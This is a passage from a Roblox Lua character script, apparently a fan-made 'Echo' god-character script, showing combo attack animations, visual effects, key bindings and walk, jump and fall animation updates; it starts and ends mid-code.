									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(5 + 50 * SIN(SINE / 12))), 1 / Animation_Speed)
								else
									RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								end
							end
							TOUCHED:Disconnect()
							COMBO = 2
						elseif COMBO == 2 then
							for i=0, 0.35, 0.1 / Animation_Speed do
								Swait()
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(15), RAD(0), RAD(5)), 3 / 3)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(15)), 1 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(15)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(-20), RAD(0), RAD(-15)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
								if ANIM=="Walk" then
									RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-5 + 50 * SIN(SINE / 12))), 1 / Animation_Speed)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(5 + 50 * SIN(SINE / 12))), 1 / Animation_Speed)
								else
									RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								end
							end
							CreateSound(1489705211,LeftArm,MATHR(7,8),MATHR(8,13)/12,false)
							local TOUCHED = HIT2()
							for i=0, 0.5, 0.1 / Animation_Speed do
								Swait()
								WACKYEFFECT2({EffectType = "Block", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftArm.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(15), RAD(0), RAD(45)), 3 / 3)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(-55)), 1 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(15)) * ANGLES(RAD(0), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, -0.5) * ANGLES(RAD(0), RAD(0), RAD(-105)) * ANGLES(RAD(90), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
								if ANIM=="Walk" then
									RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-5 + 50 * SIN(SINE / 12))), 1 / Animation_Speed)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(5 + 50 * SIN(SINE / 12))), 1 / Animation_Speed)
								else
									RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								end
							end
							TOUCHED:Disconnect()
							COMBO = 3
						elseif COMBO == 3 then
							for i=0, 0.35, 0.1 / Animation_Speed do
								Swait()
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(-5), RAD(0), RAD(0)), 3 / 3)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0.25, -0.2) * ANGLES(RAD(-25), RAD(0), RAD(0)), 1 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(75), RAD(0), RAD(45)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(75), RAD(0), RAD(-45)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
								if ANIM=="Walk" then
									RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(-25), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-5 + 50 * SIN(SINE / 12))), 1 / Animation_Speed)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(-25), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(5 + 50 * SIN(SINE / 12))), 1 / Animation_Speed)
								else
									RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(-25), RAD(70), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(-25), RAD(-70), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								end
							end
							CreateSound(1489705211,LeftArm,MATHR(7,8),MATHR(8,13)/12,false)
							local TOUCHED = HIT2()
							local TOUCHED2 = HIT()
							for i=0, 0.5, 0.1 / Animation_Speed do
								Swait()
								WACKYEFFECT2({EffectType = "Block", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftArm.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								WACKYEFFECT2({EffectType = "Block", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightArm.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(25), RAD(0), RAD(0)), 3 / 3)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, -0.3, -0.2) * ANGLES(RAD(30), RAD(0), RAD(0)), 1 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1, 0.5, -0.5) * ANGLES(RAD(90), RAD(0), RAD(-30)) * ANGLES(RAD(0), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1, 0.5, -0.5) * ANGLES(RAD(90), RAD(0), RAD(30)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
								if ANIM=="Walk" then
									RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(30), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-5 + 50 * SIN(SINE / 12))), 1 / Animation_Speed)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(30), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(5 + 50 * SIN(SINE / 12))), 1 / Animation_Speed)
								else
									RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(30), RAD(70), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(30), RAD(-70), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								end
							end
							TOUCHED:Disconnect()
							TOUCHED2:Disconnect()
							COMBO = 4
						elseif COMBO == 4 then
							for i=0, 0.5, 0.1 / Animation_Speed do
								Swait()
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(15), RAD(0), RAD(0)), 3 / 3)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, -0.3, -0.2) * ANGLES(RAD(30), RAD(0), RAD(0)), 1 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.2, 0.5, -0.5) * ANGLES(RAD(75), RAD(0), RAD(-70)) * ANGLES(RAD(0), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.2, 0.5, -0.5) * ANGLES(RAD(75), RAD(0), RAD(70)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
								if ANIM=="Walk" then
									RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(30), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-5 + 50 * SIN(SINE / 12))), 1 / Animation_Speed)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(30), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(5 + 50 * SIN(SINE / 12))), 1 / Animation_Speed)
								else
									RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(30), RAD(70), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(30), RAD(-70), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								end
							end	
							WACKYEFFECT({Time = 40,EffectType = "Block", Size = VT(0,0,0), Size2 = VT(25,25,25), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,0,-0.5), MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = 260435136, SoundPitch = 0.9, SoundVolume = 10})
							WACKYEFFECT({Time = 25,EffectType = "Slash", Size = VT(0,0,0), Size2 = VT(0.5,0,0.5), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,0,-0.5), MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
							WACKYEFFECT({Time = 25,EffectType = "Ring", Size = VT(0,0,0), Size2 = VT(1,3,3), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,0,-0.5), MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
							WACKYEFFECT({Time = 25,EffectType = "Wave", Size = VT(0,0,0), Size2 = VT(25,0,25), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,0,-0.5), MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
							ShakeCam(3,10)
							ApplyAoE(RootPart.Position,25)
							for i=0, 0.5, 0.1 / Animation_Speed do
								Swait()
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(-15), RAD(0), RAD(0)), 3 / 3)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0.25, -0.2) * ANGLES(RAD(-25), RAD(0), RAD(0)), 1 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(75), RAD(0), RAD(45)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(75), RAD(0), RAD(-45)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
								if ANIM=="Walk" then
									RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(-25), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-5 + 50 * SIN(SINE / 12))), 1 / Animation_Speed)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(-25), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(5 + 50 * SIN(SINE / 12))), 1 / Animation_Speed)
								else
									RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(-25), RAD(70), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(-25), RAD(-70), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								end
							end	
							COMBO = 1
						end
						coroutine.resume(coroutine.create(function()
							for i = 1, 50 do
								Swait()
								if ATTACK == true then
									break
								end
							end
							if ATTACK == false then
								COMBO = 1
							end
						end))
						Speed = savespeed
						ATTACK = false
						Rooted = false
						EQUIPPED = false
					end

					--//=================================\\
					--||	  ASSIGN THINGS TO KEYS
					--\\=================================//

					chatfunc("A god named "..Player.Name.." came.",2,2,false)

					Player.Chatted:Connect(function(TEXT)
						chatfunc(TEXT,2.5,2.5,false)
					end)

					function MouseDown(Mouse)
						HOLD = true
						if ATTACK == false then
							if WEAPONEQUIPPED == false then
								Combo()
							else
								BladeCombo()
							end
						end
					end

					function MouseUp(Mouse)
						HOLD = false
					end

					function KeyDown(Key)
						KEYHOLD = true
			--[[if Key == "0" and ATTACK == false and RUNNING == false then
				Sprint()
			end]]
						if Key == "q" and ATTACK == false and MODE >1 then
							SwitchModeEffect()
							MODE = MODE -1
						end
						if Key == "e" and ATTACK == false and MODE <20 then
							SwitchModeEffect()
							MODE = MODE +1
						end
						if Key == "t" then
							Notify("[Hyperskidded Echo]: ","Banlist cleared...")
							TOBANISH = {}
							TOBAN = {}
						end
						if Key == "z" and ATTACK == false then
							if GUNEQUIPPED == true then
								Shot1()
							elseif CANNONEQUIPPED == true then
								SingularityBeam()
							else
								Slash()
							end
						end
						if Key == "x" and ATTACK == false then
							if GUNEQUIPPED == true then
								Shot2()
							elseif CANNONEQUIPPED == true then
								Ka_Boom()
							else
								Stomp()
							end
						end
						if Key == "c" and ATTACK == false then
							Warp()
						end
						if Key == "v" and ATTACK == false then
							Grab()
						end
						if Key == "b" and ATTACK == false then
							Nightmare_Is_Coming()
						end
						if Key == "j" and ATTACK == false then
							ToggleCannon()
						end
						if Key == "l" and ATTACK == false then
							TerrainColSwitch()
						end
						if Key == "k" and ATTACK == false then
							ToggleGun()
						end
					end
					function KeyUp(Key)
						KEYHOLD = false
					end

					Mouse.Button1Down:connect(function(NEWKEY)
						MouseDown(NEWKEY)
					end)
					Mouse.Button1Up:connect(function(NEWKEY)
						MouseUp(NEWKEY)
					end)
					Mouse.KeyDown:connect(function(NEWKEY)
						KeyDown(NEWKEY)
					end)
					Mouse.KeyUp:connect(function(NEWKEY)
						KeyUp(NEWKEY)
					end)

					--//=================================\\
					--              Yo
					--\\=================================//

					function unanchor()
						if UNANCHOR == true then
							g = Character:GetChildren()
							for i = 1, #g do
								if g[i].ClassName == "Part" then
									g[i].Anchored = false
								end
							end
						end
					end

					--//=================================\\
					--||	WRAP THE WHOLE SCRIPT UP
					--\\=================================//

					Humanoid.Changed:connect(function(Jump)
						if Jump == "Jump" and (Disable_Jump == true) then
							Humanoid.Jump = false
						elseif Jump == "Jump" and (Disable_Jump == false) then
							wait(0.1)
						end
					end)

					coroutine.wrap(function()
						while wait() do
							if Effects:FindFirstChild("Effect") then
								local effect = Effects:FindFirstChild("Effect")
								wait(2.5)
								if effect ~= nil then
									effect:remove()
								end
							end
						end
					end)()

					while true do
						Swait()
						if AntiBullet == true then
							if game:GetService("Workspace"):FindFirstChild("EnCorrupt") == nil then
								Shield = Instance.new("UnionOperation",game:GetService("Workspace"))
								Shield.Name = "EnCorrupt"
								Shield.CanCollide = true
								Shield.Transparency = 1
								Shield.Material = "Neon"
								Shield.Color = C3(MATHR(1,255),MATHR(1,255),MATHR(1,255))
								Shield.Massless = true
								Shield.Size = Vector3.new(7.5,7.5,7.5)
								Shield.CFrame = Torso.CFrame
								local GlitchWeld = Instance.new("Weld",Shield)
								GlitchWeld.Part0 = Shield
								GlitchWeld.Part1 = Torso
								for i = 1, 10 do--face
									local FACE = CreatePart(3, Character, "Neon", 0, 0+(i-1)/16.2, "Really black", "FaceGradient", VT(1.01,0.65,1.01),false)
									Head:FindFirstChildOfClass("SpecialMesh"):Clone().Parent = FACE
									CreateWeldOrSnapOrMotor("Weld", Head, Head, FACE, CF(0,0.45-(i-1)/25,0), CF(0, 0, 0))
								end
								local Eye1 = CreatePart(3, Character, "Neon", 0, 0, "Really white", "Eye", VT(0.6,0.1,1)/2,false)
								MakeForm(Eye1,"Ball")
								CreateWeldOrSnapOrMotor("Weld", Eye1, Head, Eye1, CF(0,0.2,0) * ANGLES(RAD(0), RAD(-18), RAD(15)), CF(0, 0, 0.4))
								local Eye2 = CreatePart(3, Character, "Neon", 0, 0, "Really white", "Eye", VT(0.6,0.1,1)/2,false)
								MakeForm(Eye2,"Ball")
							end
						end
						if Character:FindFirstChild("Safety") == nil then
							local Safety = IT("Script")
							Safety.Name = "Safety"
							Safety.Parent = Character
						end
						for T = 1, #TAIL do
							if TAIL[T] ~= nil then
								TAIL[T].C1 = Clerp(TAIL[T].C1, CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(3.5 * SIN(SINE / 12))), 1 / 5)
							end
						end
						for _,v in next, Humanoid:GetPlayingAnimationTracks() do
							v:Stop();
						end
						SINE = SINE + CHANGE
						vissine = vissine + CHANGE * Sick.PlaybackLoudness/150
						sine = sine + CHANGE
						Hue = Hue + 1
						if (Hue>360) then Hue = 0 end
						local TORSOVELOCITY = (ActualVelocity * VT(1, 0, 1)).magnitude
						local TORSOVERTICALVELOCITY = ActualVelocity.y
						if lplr == Player then
							TORSOVELOCITY = (RootPart.Velocity * VT(1, 0, 1)).magnitude
							TORSOVERTICALVELOCITY = RootPart.Velocity.y
						end
						local S = 1
						local HITFLOOR,HITPOS = Raycast(RootPart.Position, (CF(RootPart.Position, RootPart.Position + VT(0, -1, 0))).lookVector, 4*SIZE, Character)
						local Welds = {
							Defaults = {
								Neck = {
									C0 = CFrame.new(0, 1 * S, 0) * CFrame.Angles(math.rad(-90), 0, math.rad(180))
								},
								RootJoint = {
									C0 = CFrame.new() * CFrame.Angles(math.rad(-90), 0, math.rad(180))
								},
								RightShoulder = {
									C0 = CFrame.new(-.5 * S, 0, 0) * CFrame.Angles(0, math.rad(90), 0)
								},
								LeftShoulder = {
									C0 = CFrame.new(.5 * S, 0, 0) * CFrame.Angles(0, math.rad(-90), 0)
								}
							},
							Neck = {
								C0 = CFrame.new(0, 1 * S, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0),
								C1 = CFrame.new(0, -.5 * S, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
							},
							RootJoint = {
								C0 = CFrame.new(),
								C1 = CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
							},
							RightShoulder = {
								C0 = CFrame.new(1 * S, .5 * S, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0),
								C1 = CFrame.new(-.5 * S, .5 * S, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
							},
							LeftShoulder = {
								C0 = CFrame.new(-1 * S, .5 * S, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0),
								C1 = CFrame.new(.5 * S, .5 * S, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
							},
							RightHip = {
								C0 = CFrame.new(1 * S, -1 * S, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0),
								C1 = CFrame.new(.5 * S, 1 * S, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
							},
							LeftHip = {
								C0 = CFrame.new(-1 * S, -1 * S, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0),
								C1 = CFrame.new(-.5 * S, 1 * S, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
							},
							Eyes = {
								C0 = CFrame.new(),
								C1 = CFrame.new(.143993527 * S, -.15178299 * S, .525008798 * S, .965925813, 0, .258819044, 0, 1, 0, -.258819044, 0, .965925813)
							},
							Sword = {
								C0 = CFrame.new(0, -1 * S, 0) * CFrame.Angles(math.rad(90), 0, 0),
								C1 = CFrame.new(0, -3.15 * S, 0)
							},
							RightWing = {
								C0 = CFrame.new(.15 * S, .5 * S, .5 * S) * CFrame.Angles(0, math.rad(90), 0),
								C1 = CFrame.new(1.1 * S, 1 * S, -.75 * S)
							},
							LeftWing = {
								C0 = CFrame.new(-.15 * S, .5 * S, .5 * S) * CFrame.Angles(0, math.rad(90), 0),
								C1 = CFrame.new(1.1 * S, 1 * S, .75 * S)
							}
						}	
						local WALKSPEEDVALUE = 12 / (Humanoid.WalkSpeed / 16)
						if ANIM == "Walk" and TORSOVELOCITY > 1 then
							if CANNONEQUIPPED == false then
								RootJoint.C1 = Clerp(RootJoint.C1, ROOTC0 * CF(0, 0, -0.15 * COS(SINE / (WALKSPEEDVALUE / 2))) * ANGLES(RAD(0), RAD(0) - RootPart.RotVelocity.Y / 75, RAD(0)), 2 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
								Neck.C1 = Clerp(Neck.C1, CF(0, -0.5, 0) * ANGLES(RAD(-90), RAD(0), RAD(180)) * ANGLES(RAD(2.5 * SIN(SINE / (WALKSPEEDVALUE / 2))), RAD(0), RAD(0) - Head.RotVelocity.Y / 30), 0.2 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
								RightHip.C1 = Clerp(RightHip.C1, CF(0.5, 0.875 - 0.125 * SIN(SINE / WALKSPEEDVALUE) - 0.15 * COS(SINE / WALKSPEEDVALUE*2), -0.125 * COS(SINE / WALKSPEEDVALUE) +0.2+ 0.2 * COS(SINE / WALKSPEEDVALUE)) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0) - RightLeg.RotVelocity.Y / 75, RAD(0), RAD(76 * COS(SINE / WALKSPEEDVALUE))), 0.2 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
								LeftHip.C1 = Clerp(LeftHip.C1, CF(-0.5, 0.875 + 0.125 * SIN(SINE / WALKSPEEDVALUE) - 0.15 * COS(SINE / WALKSPEEDVALUE*2), 0.125 * COS(SINE / WALKSPEEDVALUE) +0.2+ -0.2 * COS(SINE / WALKSPEEDVALUE)) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0) + LeftLeg.RotVelocity.Y / 75, RAD(0), RAD(76 * COS(SINE / WALKSPEEDVALUE))), 0.2 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
							else

							end
						elseif (ANIM ~= "Walk") or (TORSOVELOCITY < 1) then
							RootJoint.C1 = Clerp(RootJoint.C1, ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
							Neck.C1 = Clerp(Neck.C1, CF(0, -0.5, 0) * ANGLES(RAD(-90), RAD(0), RAD(180)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
							RightHip.C1 = Clerp(RightHip.C1, CF(0.5, 1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
							LeftHip.C1 = Clerp(LeftHip.C1, CF(-0.5, 1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
						end
						if TORSOVERTICALVELOCITY > 1 and HITFLOOR == nil and ATTACK == false then
							ANIM = "Jump"
							if WEAPONEQUIPPED == false then
								RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0*SIZE, 0*SIZE, 0*SIZE) * ANGLES(RAD(-5), RAD(0), RAD(0)), 1 / 5)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0*SIZE, 0*SIZE , 0*SIZE + ((1) - 1)) * ANGLES(RAD(-25), RAD(0), RAD(0)), 1 / 5)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5*SIZE, 0.5*SIZE, 0*SIZE) * ANGLES(RAD(-35), RAD(0), RAD(25 + 10 * COS(SINE / 12))) * RIGHTSHOULDERC0, 1 / 5)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5*SIZE, 0.5*SIZE, 0*SIZE) * ANGLES(RAD(-35), RAD(0), RAD(-25 - 10 * COS(SINE / 12))) * LEFTSHOULDERC0, 1 / 5)
								RightHip.C0 = Clerp(RightHip.C0, CF(1*SIZE, -0.4*SIZE, -0.6*SIZE) * ANGLES(RAD(1), RAD(90), RAD(0)) * ANGLES(RAD(-1 * SIN(SINE / 6)), RAD(0), RAD(0)), 1 / 5)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1*SIZE, -1*SIZE, 0*SIZE) * ANGLES(RAD(0), RAD(-85), RAD(0)) * ANGLES(RAD(-1 * SIN(SINE / 6)), RAD(0), RAD(0)), 1 / 5)
							else
								RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0, 0, 0 ) * ANGLES(RAD(-5), RAD(0), RAD(0)), 1 / 5)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0 , 0 + ((1) - 1)) * ANGLES(RAD(-45), RAD(0), RAD(0)), 1 / 5)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(180), RAD(0), RAD(15 + 5 * COS(SINE / 12))) * RIGHTSHOULDERC0, 1 / 5)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(-35), RAD(0), RAD(-25 - 10 * COS(SINE / 12))) * LEFTSHOULDERC0, 1 / 5)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -0.4, -0.6) * ANGLES(RAD(1), RAD(90), RAD(0)) * ANGLES(RAD(-1 * SIN(SINE / 6)), RAD(0), RAD(0)), 1 / 5)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-85), RAD(0)) * ANGLES(RAD(-1 * SIN(SINE / 6)), RAD(0), RAD(0)), 1 / 5)
							end
						elseif TORSOVERTICALVELOCITY < -1 and HITFLOOR == nil and ATTACK == false then
							ANIM = "Fall"
							if WEAPONEQUIPPED == false then
								RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0*SIZE, 0*SIZE, 0*SIZE) * ANGLES(RAD(15), RAD(0), RAD(0)), 1 / 5)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0*SIZE, 0*SIZE , 0 + ((1) - 1*SIZE)) * ANGLES(RAD(15), RAD(0), RAD(0)), 1 / 5)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5*SIZE, 0.5*SIZE, 0*SIZE) * ANGLES(RAD(35 - 4 * COS(SINE / 6)), RAD(0), RAD(45 + 10 * COS(SINE / 12))) * RIGHTSHOULDERC0, 1 / 5)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5*SIZE, 0.5*SIZE, 0*SIZE) * ANGLES(RAD(35 - 4 * COS(SINE / 6)), RAD(0), RAD(-45 - 10 * COS(SINE / 12))) * LEFTSHOULDERC0, 1 / 5)
								RightHip.C0 = Clerp(RightHip.C0, CF(1*SIZE, -0.3*SIZE, -0.7*SIZE) * ANGLES(RAD(-25 + 5 * SIN(SINE / 12)), RAD(90), RAD(0)) * ANGLES(RAD(-1 * SIN(SINE / 6)), RAD(0), RAD(0)), 1 / 5)
